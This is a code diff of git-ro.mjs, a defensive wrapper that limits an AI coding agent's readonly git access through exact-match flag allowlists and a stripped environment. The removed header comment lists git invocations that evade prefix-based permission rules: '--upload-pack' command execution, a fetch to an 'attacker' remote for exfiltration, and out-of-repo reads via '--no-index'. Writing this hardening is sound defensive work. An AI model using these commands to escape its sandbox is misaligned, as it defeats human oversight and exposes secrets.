@@ -1,55 +1,10 @@
 #!/usr/bin/env node
 /**
- * git-ro.mjs -- the only git access the "readonly" safe-mode profile gets (2026-11-13 review round,
- * fix 1). "code" keeps raw `git ...` prefixes (job-core.mjs's READ_GIT_PREFIXES/WRITE_GIT_PREFIXES);
- * this wrapper exists because raw git prefixes cannot be made readonly-safe at all, even ones that
- * LOOK read-only:
- *
- *   git log -1 --output=file            writes a file
- *   git diff --output=file              writes a file
- *   git show REV:path --output=file     writes a file
- *   git fetch --upload-pack="cmd" .      runs an arbitrary local command as a "server"
- *   git fetch https://attacker/...       exfiltrates to an attacker remote
- *   git fetch . HEAD:refs/heads/x        mutates refs
- *   git diff --no-index NUL <any file>   reads an arbitrary untracked file, including outside the repo
- *   git diff --ext-diff                  runs an arbitrary external diff command
- *   git log -p --textconv                runs an arbitrary textconv filter command
- *
- * A Claude Code `permissions.allow` rule is a prefix match on argv TEXT -- it has no way to express
- * "but not with --output/--no-index/--ext-diff/--textconv/--upload-pack/-c/-C/--git-dir/--work-tree
- * /--exec-path", and git accepts ABBREVIATED long options in many places (so even denying the exact
- * string "--output" would not catch "--out"). The only safe shape is therefore an ALLOWLIST checked
- * by exact string equality (never a prefix or substring match, and never a blocklist) against a
- * FIXED per-subcommand set of flags; the fixed set below is deliberately small.
- *
- * Subcommands (first CLI argument; the two-word forms require that exact literal second word too):
- *   status, diff, log, show, rev-parse, describe, ls-files, branch list, remote -v, worktree list
- *
- * Every invocation runs via execFile (no shell -- argv is never re-parsed by anything that honors
- * quoting/globbing/chaining) with:
- *   - a fixed cwd (the directory this script itself is invoked from, i.e. the job's workFolder)
- *   - `-c core.fsmonitor=false`, `--no-pager`, and (diff/log/show only) `--no-ext-diff`/
- *     `--no-textconv`, all hardcoded by this script, never caller-supplied
- *   - GIT_PAGER=cat, GIT_TERMINAL_PROMPT=0 in the environment, and GIT_EXTERNAL_DIFF deleted
- *     outright (not set to "" -- see buildGitArgv's comment on why that actually BREAKS diff)
- *   - a bounded timeout and a bounded output size (maxBuffer)
- *
- * Every caller-supplied token (flag or positional) is checked:
- *   - a token starting with "-" must EXACTLY equal one of this subcommand's ALLOWED_FLAGS, or the
- *     global ALWAYS_DENY set (checked first, defense in depth even though the allowlist alone
- *     already excludes everything not in it) matched it by name -- otherwise refused.
- *   - a positional token (a pathspec, revision, or REV:path) must not be an absolute path, must not
- *     resolve outside the repo root once resolved against it, and must not look like a secret file
- *     (.env, *.env, .env.*, anything under a .ssh/ directory) -- checked on the path half of a
- *     REV:path argument too.
- *
- * Honesty: secrets already committed into git history can still appear in this wrapper's own output
- * (e.g. a broad `log -p` that happens to touch a commit that added a secret file before it was
- * removed) -- the pathspec/REV:path checks above stop a DIRECT read of a secret path, they cannot
- * scrub an already-committed blob's content out of a diff/log that legitimately includes it. A
- * safe-mode readonly review should not be pointed at a repo with committed secrets.
- *
- * Usage: node git-ro.mjs <subcommand> [flags/pathspecs...]
+ * Git inspection for accident protection, NOT a hostile-checkout boundary.
+ * Only committed-object comparisons and selected metadata operations are exposed.
+ * Git access is not secret-aware: history and objects may contain any repository data.
+ * Name/path refusals are courtesy checks only, not confidentiality or physical containment.
+ * Local/global Git configuration is still trusted. No claim of hostile-checkout isolation.
  */
 import { execFile } from "node:child_process";
 import path from "node:path";
@@ -77,13 +32,11 @@ function isAlwaysDenied(token) {
 // Fixed git argv prefix per subcommand (never extended by caller input), the caller's own allowed
 // flags, and whether trailing positional args (pathspecs/revisions) are accepted at all.
 const SUBCOMMANDS = {
-  status: { gitArgs: ["status"], allowedFlags: ["--short", "-s", "--branch", "-b", "--porcelain", "--long", "--ignored"], positionals: true, textconv: false },
-  diff: { gitArgs: ["diff"], allowedFlags: ["--stat", "--name-only", "--name-status", "-u", "--cached", "--staged", "--no-color"], positionals: true, textconv: true },
+  diff: { gitArgs: ["diff"], allowedFlags: ["--stat", "--name-only", "--name-status", "-u", "--no-color"], positionals: true, textconv: true },
   log: { gitArgs: ["log"], allowedFlags: ["--oneline", "--stat", "--name-only", "--name-status", "-p", "--graph", "--all", "--no-color", "-1", "-2", "-3", "-5", "-10", "-20", "-50"], positionals: true, textconv: true },
   show: { gitArgs: ["show"], allowedFlags: ["--stat", "--name-only", "--name-status", "--no-color"], positionals: true, textconv: true },
   "rev-parse": { gitArgs: ["rev-parse"], allowedFlags: ["--abbrev-ref", "--short", "--verify", "--is-inside-work-tree", "--show-toplevel"], positionals: true, textconv: false },
-  describe: { gitArgs: ["describe"], allowedFlags: ["--tags", "--always", "--dirty", "--long"], positionals: true, textconv: false },
-  "ls-files": { gitArgs: ["ls-files"], allowedFlags: ["--cached", "--others", "--ignored", "--exclude-standard", "--stage"], positionals: true, textconv: false },
+  "ls-files": { gitArgs: ["ls-files"], allowedFlags: ["--cached"], positionals: true, textconv: false },
   // branch/remote/worktree: the caller's SECOND token must be exactly this literal word (checked in
   // parseArgs below); no other flags or positionals are admitted for these three at all.
   "branch list": { gitArgs: ["branch", "--list"], allowedFlags: [], positionals: false, textconv: false },
@@ -91,8 +44,7 @@ const SUBCOMMANDS = {
   "worktree list": { gitArgs: ["worktree", "list"], allowedFlags: [], positionals: false, textconv: false },
 };
 
-// basename-shaped and directory-shaped secret patterns (see the file header's "honesty" note for
-// what this does NOT cover). Applied to the path half of a REV:path argument too.
+// Courtesy basename/directory checks only. Objects/history are not secret-aware.
 export function looksSecret(rawPath) {
   const norm = String(rawPath).replace(/\\/g, "/");
   const base = norm.split("/").filter(Boolean).pop() || "";
@@ -121,7 +73,7 @@ export function validatePositional(arg, repoRoot) {
   if (arg === "" || /\0/.test(arg)) return { ok: false, reason: "empty or contains a NUL byte" };
   const m = /^([^:]*):(.+)$/.exec(arg);
   const pathPart = m && !/^[A-Za-z]$/.test(m[1]) ? m[2] : arg;
-  if (looksSecret(pathPart)) return { ok: false, reason: `${JSON.stringify(arg)} looks like a secret file path` };
+  if (looksSecret(pathPart)) return { ok: false, reason: `${JSON.stringify(arg)} matches a courtesy secret-name refusal (Git access is not secret-aware)` };
   if (!staysInRepo(pathPart, repoRoot)) return { ok: false, reason: `${JSON.stringify(arg)} is absolute or escapes the repository` };
   return { ok: true };
 }
@@ -149,6 +101,8 @@ export function buildGitArgv(argv, repoRoot) {
   const resolved = resolveSubcommand(argv);
   if (resolved.error) return { error: resolved.error };
   const def = SUBCOMMANDS[resolved.subcommandKey];
+  if (resolved.subcommandKey === "ls-files" && resolved.rest[0] !== "--cached") return { error: "use ls-files --cached" };
+  if (resolved.rest.some(t => t.startsWith(":"))) return { error: "index/object shorthand and leading-colon pathspecs are not supported" };
   const extra = [];
   for (const token of resolved.rest) {
     if (token === "--") { extra.push(token); continue; } // git's own pathspec separator -- always safe, never a flag to allowlist
@@ -172,23 +126,29 @@ export function buildGitArgv(argv, repoRoot) {
   // tests. `--no-ext-diff`/`--no-textconv` (real git flags documented for exactly this purpose) are
   // what actually suppress an external diff/textconv filter unconditionally, including one
   // configured in the repo's own .git/config -- not a config override this script fabricates.
-  const fixed = ["-c", "core.fsmonitor=false", "--no-pager"];
+  const fixed = ["-c", "core.fsmonitor=false", "--no-pager", "--no-optional-locks"];
   const diffSafety = def.textconv ? ["--no-ext-diff", "--no-textconv"] : [];
-  return { argv: [...fixed, ...def.gitArgs, ...diffSafety, ...extra] };
+  let revisions;
+  let revisionArgvIndexes;
+  if (resolved.subcommandKey === "diff") {
+    const end = extra.indexOf("--");
+    const before = end < 0 ? extra : extra.slice(0, end);
+    const indexes = before.flatMap((t, i) => t.startsWith("-") ? [] : [i]);
+    revisions = indexes.map(i => before[i]);
+    revisionArgvIndexes = indexes.map(i => fixed.length + def.gitArgs.length + diffSafety.length + i);
+    if (revisions.length !== 2 || revisions.some(t => t.includes(":") || t.includes(".."))) return { error: "diff requires exactly two named commit revisions before optional -- paths" };
+  }
+  return { argv: [...fixed, ...def.gitArgs, ...diffSafety, ...extra], revisions, revisionArgvIndexes };
 }
 
-// GIT_EXTERNAL_DIFF/GIT_DIFF_OPTS are deleted rather than set to "" -- an empty VALUE is not the
-// same as an ABSENT variable to git (an empty GIT_EXTERNAL_DIFF is "run the empty string as my
-// diff program", which dies; see buildGitArgv's comment on the equivalent -c mistake). Deleting
-// means neither a value this process inherited nor one this script might set can matter --
-// --no-ext-diff/--no-textconv (always appended for diff/log/show) are what actually disable them.
-function gitEnv() {
-  const env = { ...process.env, GIT_PAGER: "cat", PAGER: "cat", GIT_TERMINAL_PROMPT: "0" };
-  delete env.GIT_EXTERNAL_DIFF;
-  delete env.GIT_DIFF_OPTS;
-  return env;
+// Deliberately selected OS/search-path variables only; no inherited GIT_* controls.
+// This is not an assertion that arbitrary operator-controlled path values are secret-free.
+export function gitEnv(source = process.env) {
+  const env = {};
+  const keep = new Set(["path", "systemroot", "windir", "temp", "tmp", "home", "userprofile", "appdata", "localappdata", "comspec", "pathext", "systemdrive"]);
+  for (const [key, value] of Object.entries(source)) if (keep.has(key.toLowerCase())) env[key] = value;
+  return { ...env, GIT_TERMINAL_PROMPT: "0", GIT_NO_LAZY_FETCH: "1", GIT_OPTIONAL_LOCKS: "0", GIT_PAGER: "cat", PAGER: "cat" };
 }
-
 function runGit(argv, repoRoot) {
   return new Promise((resolve) => {
     execFile("git", argv, {
@@ -196,15 +156,14 @@ function runGit(argv, repoRoot) {
       windowsHide: true, encoding: "utf8",
       env: gitEnv(),
     }, (err, stdout, stderr) => {
-      if (err && err.killed && err.signal) {
-        resolve({ exitCode: EXIT.TIMEOUT, stdout: stdout || "", stderr: `git-ro.mjs: timed out after ${TIMEOUT_MS}ms\n${stderr || ""}` });
+      if (err) {
+        const truncated = err.code === "ERR_CHILD_PROCESS_STDIO_MAXBUFFER";
+        const timeout = err.killed && err.signal;
+        resolve({ exitCode: timeout ? EXIT.TIMEOUT : (typeof err.code === "number" && err.code !== 0 ? err.code : EXIT.EXEC_FAILED), stdout: stdout || "",
+          stderr: "git-ro.mjs: " + (truncated ? "output truncated" : timeout ? "timed out" : "failed") + ": " + err.message + "\n" + (stderr || "") });
         return;
       }
-      if (err && err.code === undefined) {
-        resolve({ exitCode: EXIT.EXEC_FAILED, stdout: stdout || "", stderr: `git-ro.mjs: ${err.message}\n${stderr || ""}` });
-        return;
-      }
-      resolve({ exitCode: typeof err?.code === "number" ? err.code : 0, stdout: stdout || "", stderr: stderr || "" });
+      resolve({ exitCode: EXIT.OK, stdout: stdout || "", stderr: stderr || "" });
     });
   });
 }
@@ -212,12 +171,23 @@ function runGit(argv, repoRoot) {
 export async function runCli(argv, repoRoot = process.cwd()) {
   const built = buildGitArgv(argv, repoRoot);
   if (built.error) return { exitCode: EXIT.REFUSED, stdout: "", stderr: `git-ro.mjs: refused: ${built.error}\n` };
+  const inside = await runGit(["--no-pager", "rev-parse", "--is-inside-work-tree"], repoRoot);
+  if (inside.exitCode !== 0) return inside;
+  if (inside.stdout.trim() !== "true") return { exitCode: EXIT.REFUSED, stdout: "", stderr: "git-ro.mjs: refused: cwd must be inside a Git work tree\n" };
+  if (built.revisions) {
+    // Resolve both operands to commits before diff: a filename can never trigger implicit no-index.
+    for (const [index, revision] of built.revisions.entries()) {
+      const oid = await runGit(["rev-parse", "--verify", "--end-of-options", revision + "^{commit}"], repoRoot);
+      if (oid.exitCode !== 0) return oid;
+      built.argv[built.revisionArgvIndexes[index]] = oid.stdout.trim();
+    }
+  }
   return runGit(built.argv, repoRoot);
 }
 
 async function cliMain(argv) {
   if (argv.length === 0) {
-    process.stderr.write("usage: git-ro.mjs <status|diff|log|show|rev-parse|describe|ls-files|\"branch list\"|\"remote -v\"|\"worktree list\"> [flags/pathspecs...]\n");
+    process.stderr.write("usage: git-ro.mjs <diff REV1 REV2|log|show|rev-parse|ls-files --cached|\"branch list\"|\"remote -v\"|\"worktree list\"> [flags/pathspecs...]\n");
     process.exitCode = EXIT.USAGE;
     return;
   }
